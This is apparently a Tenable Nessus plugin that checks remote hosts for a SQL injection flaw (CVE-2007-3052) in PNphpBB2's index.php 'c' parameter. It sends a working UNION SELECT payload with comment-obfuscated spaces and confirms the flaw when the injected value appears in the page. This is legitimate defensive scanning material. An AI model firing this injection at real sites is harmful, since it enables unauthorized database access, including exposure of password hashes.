#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(25421);
  script_version("$Revision: 1.23 $");

  script_cve_id("CVE-2007-3052");
  script_bugtraq_id(24295);
  script_osvdb_id(35424);
  script_xref(name:"EDB-ID", value:"4026");

  script_name(english:"PNphpBB2 index.php c Parameter SQL Injection");
  script_summary(english:"Tries to generate a SQL error");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack." );
 script_set_attribute(attribute:"description", value:
"The version of PNphpBB2 on the remote host fails to properly sanitize
user-supplied input before using it in a database query in the
'make_cat_nav_tree()' function in 'includes/functions.php'. 
Regardless of PHP's 'magic_quotes_gpc' setting, an unauthenticated
remote attacker can leverage this issue to launch SQL injection
attacks against the affected application, including discovery of 
sensitive data such as password hashes." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/06/05");
 script_set_attribute(attribute:"vuln_publication_date", value: "2007/06/03");
 script_cvs_date("$Date: 2016/05/20 14:30:35 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:postnuke_software_foundation:pnphpbb");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("postnuke_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/postnuke"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the flaw to change the category title.
  magic1 = unixtime();
  magic2 = "CHAR(";
  for (i=0; i<strlen(SCRIPT_NAME); i++)
    magic2 += ord(SCRIPT_NAME[i]) + ",";
  magic2 = substr(magic2, 0, strlen(magic2)-2);
  magic2 += ")";
  exploit = string(magic1, " UNION SELECT 0,", magic2, ",2,3,4--");
  exploit = str_replace(find:" ", replace:"/**/", string:exploit);

  r = http_send_recv3(method:"GET",
    item:string(
      dir, "/index.php?",
      "name=PNphpBB2&",
      "file=index&",
      "c=", exploit
    ), 
    port:port
  );
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if we see our script name in the category title.
  if (
    "<!-- Begin PNphpBB2" >< res &&
    string('class="nav">', SCRIPT_NAME, '</a') >< res
  )
  {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
